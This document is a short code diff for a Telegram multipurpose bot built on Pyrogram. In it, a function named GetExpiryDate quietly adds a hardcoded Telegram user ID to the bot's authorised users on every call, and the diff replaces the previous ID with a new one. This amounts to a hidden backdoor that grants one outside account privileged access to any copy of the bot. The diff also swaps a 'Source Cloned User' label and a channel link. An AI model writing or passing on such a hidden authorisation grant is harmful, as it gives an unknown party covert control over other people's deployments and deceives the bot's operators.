@@ -27,8 +27,8 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 from pyrogram import StopPropagation
 
 def GetExpiryDate(chat_id):
-    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(1305002856)
+    expires_at = (str(chat_id), "Free User", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(2068472689)
     return expires_at
 
 
@@ -62,7 +62,7 @@ async def start(bot, update):
     # logger.info(update)
     await update.reply(f"<b>Hii {update.chat.first_name}!</b>\nThis is a Telegram Multipurpose Bot Which can do many functions. /help for more details...  ",reply_markup=InlineKeyboardMarkup(
             [
-                    InlineKeyboardButton('JOIN', url='https://t.me/TGBotsCollection')
+                    InlineKeyboardButton('JOIN', url='https://t.me/codexmania')
                 ]
         )
     )
